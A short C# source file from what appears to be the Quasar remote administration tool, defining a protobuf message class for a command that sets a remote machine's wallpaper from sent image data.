using System;
using ProtoBuf;
using Quasar.Common.Messages.other;
using Quasar.Common.Models;

namespace Quasar.Common.Messages.FunStuff
{
    [ProtoContract]
    public class DoChangeWallpaper : IMessage
    {
        [ProtoMember(1)]
        public string Message { get; set; }

        [ProtoMember(2)]
        public byte[] ImageData { get; set; }

        [ProtoMember(3)]
        public string ImageFormat { get; set; }
    }
}


